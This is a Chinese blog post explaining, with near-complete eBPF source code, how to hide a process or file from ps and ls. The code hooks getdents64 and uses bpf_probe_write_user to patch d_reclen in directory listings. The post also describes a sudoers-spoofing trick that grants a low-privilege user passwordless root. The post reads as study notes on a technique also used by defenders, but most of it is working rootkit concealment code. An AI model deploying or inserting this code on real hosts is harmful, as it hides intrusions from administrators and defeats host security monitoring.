---
layout:     post
title:      EBPF 内核态代码学习（二）：使用 eBPF 隐藏进程 / 文件信息
subtitle:   理解 ps/ls 等运行原理
date:       2024-11-09
author:     pandaychen
header-img:
catalog: true
tags:
    - eBPF
---

##  0x00    前言
在主机安全对抗中，有一项技术叫进程隐藏，即能让特定的进程对 os 的常规检测机制变得不可见，其基本原理是 Linux 系统的 VFS，每个进程都在 `/proc/` 目录下有一个以其进程 ID 命名的子目录，其中包含了该进程的各种信息（`ps` 命令就是通过查找这些文件夹来显示进程信息的，`ls` 命令也是同样原理）

-   进程隐藏：如果能隐藏某个进程的 `/proc/${id}` 目录，就能让这个进程对 `ps` 的搜索失效
-   文件隐藏

实现上述两种场景，核心就是两点：
-   hook 系统调用： `getdents64` 系统调用可以读取目录下的文件信息，可以通过挂接这个系统调用，修改它返回的结果，从而达到隐藏文件的目的
-   借助于 eBPF `bpf_probe_write_user` 功能，该函数可以 ** 修改用户空间的内存 **，因此能用来修改 `getdents64` 系统调用返回的结果（注意：内核空间是无法修改的）

####    bpf_probe_write_user 方法
[`bpf_probe_write_user`](https://docs.ebpf.io/linux/helper-function/bpf_probe_write_user/)，该函数允许 eBPF 程序写入当前正在运行的进程的用户空间内存，因此基于 ebpf 实现的恶意软件可以使用此功能在 hook 系统调用运行期间修改进程的内存，例如一个典型的恶意场景是修改 `sudoer` 文件，参考 [使用 eBPF 添加 sudo 用户](https://eunomia.dev/zh/tutorials/26-sudo/)

该恶意命令的工作原理是：通过拦截 `sudo` 读取 `/etc/sudoers` 文件这个过程，并将第一行覆盖为 `<username> ALL=(ALL:ALL) NOPASSWD:ALL #` 的方式工作，这一过程有点像欺骗了 `sudo`，使其认为这个低权限用户被允许成为 `root`。其他程序如 `cat` 或 `sudoedit` 不受到影响，因为对于这些程序来说，实际 `/etc/sudoers` 文件内容并未改变，低权限用户并没有这些权限，只是恶意程序修改了返回的用户态内存（行尾的 `#` 确保行的其余部分被当作注释处理，因此并不会破坏文件的逻辑）

##  0x01   getdents64 的实现
`getdents64`​系统调用，用于扫描并读取指定目录的目录项信息。它的功能是从指定的目录中读取目录项的详细信息，包括文件名、文件类型、文件的 `inode` 号等，`64` 表示支持大文件（`64` 位文件偏移），每次调用该函数时，它会读取尽可能多的目录项，直到 `dirent​` 缓冲区填满或者目录已经读取完毕

```CPP
//fd​：文件描述符，通常是一个已经打开的目录文件的文件描述符
​//dirent​：一个用于存储目录项信息的缓冲区，格式化后的，也可以理解为一个 long unsigned int*
​//count​：dirent​ 缓冲区的大小，以字节为单位

// 返回值：
// 成功时，返回读取的字节数
// 如果已到达目录的末尾（没有更多的目录项可读），返回 0
// 出错时，返回 -1，并设置 errno​ 变量来指示错误的类型
int getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);
```

这里要了解，参数 `dirp` 并不是仅仅指向一个 `linux_dirent64` 结构，而是一个 index 数组链表，一个用于存储（保存）目录项 dentry 信息的缓冲区，注意这个`dirp`是一个`linux_dirent64`型的顺序数组的首地址

其中，`struct linux_dirent64`（目录项）的定义如下，结构体包含了目录项的各种属性，如文件名、文件类型、inode 号等

```CPP
//因为有"柔性数组"d_name，所以用d_reclen记录了大小，这样就可以在"目录条目"buffer中定位到下一个"目录条目"
struct linux_dirent64 {
     u64        d_ino;    /* 64-bit inode number */
     u64        d_off;    /* 64-bit offset to next structure */
     unsigned short d_reclen; /* Size of this dirent */ //保存了当前结构体（目录条目）的长度
     unsigned char  d_type;   /* File type */
     char           d_name[]; /* Filename (null-terminated) */ //柔性数组：
};
```

##  0x02    ebpf 的 hook 实现
要实现的目的如下，假设黄色部分是需要隐藏的，那么 ebpf hook 要做的事情是在调用 `getdents64` 时，找到这个部分并且跳过它

![dirent](https://github.com/pandaychen/pandaychen.github.io/blob/master/blog_img/ebpf/dev/hidepid/ebpf-hide-pid-1.png?raw=true)

本文分析的内核态代码参考[eunomia-bpf](https://github.com/eunomia-bpf/bpf-developer-tutorial/blob/main/src/24-hide/pidhide.bpf.c)的实现

####    MAPS 定义

```CPP
#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>
#include "common.h"

char LICENSE[] SEC("license") = "Dual BSD/GPL";

// Ringbuffer Map to pass messages from kernel to user
struct {
    __uint(type, BPF_MAP_TYPE_RINGBUF);
    __uint(max_entries, 256 * 1024);
} rb SEC(".maps");

// Map to fold the dents buffer addresses
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 8192);
    __type(key, size_t);
    __type(value, long unsigned int);
} map_buffs SEC(".maps");

// Map used to enable searching through the
// data in a loop
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 8192);
    __type(key, size_t);
    __type(value, int);
} map_bytes_read SEC(".maps");

// Map with address of actual
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, 8192);
    __type(key, size_t);
    __type(value, long unsigned int);
} map_to_patch SEC(".maps");

// Map to hold program tail calls
struct {
    __uint(type, BPF_MAP_TYPE_PROG_ARRAY);
    __uint(max_entries, 5);
    __type(key, __u32);
    __type(value, __u32);
} map_prog_array SEC(".maps");
```

各个MAPS的用途如下：

| MAPS变量 | 类型 |size| 作用 |
| :-----:| :----: | :----: |:----: |
| `map_buffs` | `BPF_MAP_TYPE_HASH`| `8192` | KEY：进程id，VALUE：存储目录项（`struct linux_dirent64`）的缓冲区地址 |
| `map_bytes_read` | `BPF_MAP_TYPE_HASH` |`8192`| 用于在数据循环中启用搜索 |
|`map_to_patch`|`BPF_MAP_TYPE_HASH` | `8192`| 存储了需要被修改的目录项的地址 | 
|`map_prog_array`|`BPF_MAP_TYPE_PROG_ARRAY`| `5`| 用于尾调用数组的注册，保存程序的尾部调用|

####    内核态实现
以tracepoint为例，需要实现的hook点如下：
-   `tracepoint:syscalls:sys_enter_getdents64`：
-   `tracepoint:syscalls:sys_exit_getdents64`：在 `getdents64` 系统调用返回时被调用

1、`sys_enter_getdents64`

```CPP
SEC("tp/syscalls/sys_enter_getdents64")
int handle_getdents_enter(struct trace_event_raw_sys_enter *ctx)
{
    size_t pid_tgid = bpf_get_current_pid_tgid();
    // Check if we're a process thread of interest
    // if target_ppid is 0 then we target all pids
    if (target_ppid != 0)       //target_ppid为检测条件，为0时则检测所有调用getdents64的进程
    {
        struct task_struct *task = (struct task_struct *)bpf_get_current_task(); 
        int ppid = BPF_CORE_READ(task, real_parent, tgid);  // 获取正在调用getdents64系统调用的某个程序的ppid
        if (ppid != target_ppid)
        {
            return 0;
        }
    }
    int pid = pid_tgid >> 32;   //获取进程id
    unsigned int fd = ctx->args[0];
    unsigned int buff_count = ctx->args[2];

    // Store params in map for exit function
    struct linux_dirent64 *dirp = (struct linux_dirent64 *)ctx->args[1];

    //存储啥进程调用了getdents64函数，并且返回记录的地址是什么
    bpf_map_update_elem(&map_buffs, &pid_tgid, &dirp, BPF_ANY);

    return 0;
}
```

2、`sys_exit_getdents64`，核心逻辑如下：

-   循环来迭代读取目录的内容，检查当前的dentry的name是否匹配到待隐藏的目录名字
-   设置最大循环次数，在这个循环次数内，如果搜索到，则通过tail call跳转到`handle_getdents_patch`处理
-   如果在有限次数中未搜索到，则使用tail call的方式跳转回`handle_getdents_exit`继续本流程（因为verifier的限制不可以无限循环），但是需要保存当前已经读取到的`dirp`指针的偏移`bpos`（理解这里很重要）
-   除此之外，由于隐藏进程目录需要知道该目录的前一个`struct linux_dirent64`的地址，所以每遍历一个都要保存前一个目录项的地址`dirp`，保存在`map_to_patch`中

```CPP
SEC("tp/syscalls/sys_exit_getdents64")
int handle_getdents_exit(struct trace_event_raw_sys_exit *ctx)
{
    size_t pid_tgid = bpf_get_current_pid_tgid();
    int total_bytes_read = ctx->ret;        //getdents64的返回值
    // if bytes_read is 0, everything's been read
    if (total_bytes_read <= 0)
    {
        //如果没有读取到内容（getdents64返回值<=0），就直接返回
        return 0;
    }

    // Check we stored the address of the buffer from the syscall entry
    //从 map_buffs 这个 map 中获取 getdents64 系统调用入口处保存的目录内容的地址
    long unsigned int *pbuff_addr = bpf_map_lookup_elem(&map_buffs, &pid_tgid);
    if (pbuff_addr == 0)
    {
        // 如果没有存储过，那么也直接返回，不处理
        return 0;
    }

    // All of this is quite complex, but basically boils down to
    // Calling 'handle_getdents_exit' in a loop to iterate over the file listing
    // in chunks of 200, and seeing if a folder with the name of our pid is in there.
    // If we find it, use 'bpf_tail_call' to jump to handle_getdents_patch to do the actual
    // patching
    long unsigned int buff_addr = *pbuff_addr;
    struct linux_dirent64 *dirp = 0;
    int pid = pid_tgid >> 32;
    short unsigned int d_reclen = 0;
    char filename[MAX_PID_LEN];

    //接下来的核心逻辑，就是在dirp指向的内存空间中遍历及搜索，找到命中条件的struct linux_dirent64结构

    unsigned int bpos = 0;
    // 查找对pid
    unsigned int *pBPOS = bpf_map_lookup_elem(&map_bytes_read, &pid_tgid);
    if (pBPOS != 0)
    {
        bpos = *pBPOS;
    }

    //采用分块处理（每次200条目）是为了绕过内核的指令数限制
    for (int i = 0; i < 200; i++)
    {
        if (bpos >= total_bytes_read)
        {
            // 已经读完了，跳出
            break;
        }

        //根据切割的linux_dirent64结构进行遍历
        dirp = (struct linux_dirent64 *)(buff_addr + bpos);

        // 从内核空间读到用户空间
        bpf_probe_read_user(&d_reclen, sizeof(d_reclen), &dirp->d_reclen);
        bpf_probe_read_user_str(&filename, pid_to_hide_len, dirp->d_name);  //进程id为目录名

        int j = 0;
        for (j = 0; j < pid_to_hide_len; j++)
        {
            if (filename[j] != pid_to_hide[j])
            {
                break;
            }
        }
        if (j == pid_to_hide_len)
        {
            // ***********
            // We've found the folder!!!
            // Jump to handle_getdents_patch so we can remove it!
            // ***********
            // 找到了需要隐藏的目录，那么使用尾调用的方法进行屏蔽处理，不会再跳转回来
            bpf_map_delete_elem(&map_bytes_read, &pid_tgid);
            bpf_map_delete_elem(&map_buffs, &pid_tgid);
            bpf_tail_call(ctx, &map_prog_array, PROG_02);
        }

        //当前的linux_dirent64不匹配，需要保存dirp这个地址，为什么呢？
        bpf_map_update_elem(&map_to_patch, &pid_tgid, &dirp, BPF_ANY);
        bpos += d_reclen;
    }

    // If we didn't find it, but there's still more to read,
    // jump back the start of this function and keep looking
    // 说明还没有读完
    if (bpos < total_bytes_read)
    {
        //保存当前已读的偏移，下次继续读
        bpf_map_update_elem(&map_bytes_read, &pid_tgid, &bpos, BPF_ANY);
        bpf_tail_call(ctx, &map_prog_array, PROG_01);
    }

    //已经处理完了，删除map
    bpf_map_delete_elem(&map_bytes_read, &pid_tgid);
    bpf_map_delete_elem(&map_buffs, &pid_tgid);

    return 0;
}
```

3、处理需要被隐藏的进程目录`handle_getdents_patch`实现如下

-   隐藏的方式：读取待隐藏的目录项的前一个目录的指针，并且修改其 `d_reclen` 字段，让它覆盖下一个目录项，这样就可以隐藏目标进程（目录）了，核心代码`bpf_probe_write_user(&dirp_previous->d_reclen, &d_reclen_new, sizeof(d_reclen_new))`
-   使用了 `bpf_probe_read_user`、`bpf_probe_read_user_str`、`bpf_probe_write_user` 这几个函数来读取和写入用户空间的数据。因为在内核空间不能直接访问用户空间的数据，必须使用helper提供的函数
-   覆盖逻辑见图，比较清晰了

```CPP
SEC("tp/syscalls/sys_exit_getdents64")
int handle_getdents_patch(struct trace_event_raw_sys_exit *ctx)
{
    // Only patch if we've already checked and found our pid's folder to hide
    size_t pid_tgid = bpf_get_current_pid_tgid();
    long unsigned int* pbuff_addr = bpf_map_lookup_elem(&map_to_patch, &pid_tgid);
    if (pbuff_addr == 0) {
        // 校验前一个dentry是否存在
        return 0;
    }

    // Unlink target, by reading in previous linux_dirent64 struct,
    // and setting it's d_reclen to cover itself and our target.
    // This will make the program skip over our folder.
    //注释：通过增大"目标进程所属的目录条目的前一个目录条目"的d_reclen值，使得用户程序在遍历*dirp结果时，就会跳过"目标进程所属的目录条目"
    long unsigned int buff_addr = *pbuff_addr;
    struct linux_dirent64 *dirp_previous = (struct linux_dirent64 *)buff_addr;
    short unsigned int d_reclen_previous = 0;
    bpf_probe_read_user(&d_reclen_previous, sizeof(d_reclen_previous), &dirp_previous->d_reclen);

    struct linux_dirent64 *dirp = (struct linux_dirent64 *)(buff_addr+d_reclen_previous);
    short unsigned int d_reclen = 0;
    bpf_probe_read_user(&d_reclen, sizeof(d_reclen), &dirp->d_reclen);

    // Debug print
    char filename[MAX_PID_LEN];
    bpf_probe_read_user_str(&filename, pid_to_hide_len, dirp_previous->d_name);
    filename[pid_to_hide_len-1] = 0x00;
    bpf_printk("[PID_HIDE] filename previous %s\n", filename);
    bpf_probe_read_user_str(&filename, pid_to_hide_len, dirp->d_name);
    filename[pid_to_hide_len-1] = 0x00;
    bpf_printk("[PID_HIDE] filename next one %s\n", filename);

    // Attempt to overwrite
    short unsigned int d_reclen_new = d_reclen_previous + d_reclen;
    // 重要：因为&dirp_previous->d_reclen是用户空间地址，而不是内核空间地址，所以ebpf可以用bpf_probe_write_user helper functions 修改dirp地址中的数据
    long ret = bpf_probe_write_user(&dirp_previous->d_reclen, &d_reclen_new, sizeof(d_reclen_new));

    // Send an event
    struct event *e;
    e = bpf_ringbuf_reserve(&rb, sizeof(*e), 0);
    if (e) {
        e->success = (ret == 0);
        e->pid = (pid_tgid >> 32);
        bpf_get_current_comm(&e->comm, sizeof(e->comm));
        bpf_ringbuf_submit(e, 0);
    }

    bpf_map_delete_elem(&map_to_patch, &pid_tgid);
    return 0;
}
```


####    用户态实现
这里主要列举一下tail_call的注册：

```CPP
int main(){
    //...
    // Setup Maps for tail calls
    int index = PROG_01;
    int prog_fd = bpf_program__fd(skel->progs.handle_getdents_exit);
    int ret = bpf_map_update_elem(
        bpf_map__fd(skel->maps.map_prog_array),
        &index,
        &prog_fd,
        BPF_ANY);
    if (ret == -1)
    {
        printf("Failed to add program to prog array! %s\n", strerror(errno));
        goto cleanup;
    }
    index = PROG_02;
    prog_fd = bpf_program__fd(skel->progs.handle_getdents_patch);
    ret = bpf_map_update_elem(
        bpf_map__fd(skel->maps.map_prog_array),
        &index,
        &prog_fd,
        BPF_ANY);
    if (ret == -1)
    {
        printf("Failed to add program to prog array! %s\n", strerror(errno));
        goto cleanup;
    }
    //...
}
```

##  0x03  参考
-   [eBPF 开发实践：使用 eBPF 隐藏进程或文件信息](https://eunomia.dev/zh/tutorials/24-hide/)
-   [sudoadd](https://github.com/eunomia-bpf/bpf-developer-tutorial/blob/main/src/26-sudo/sudoadd.bpf.c)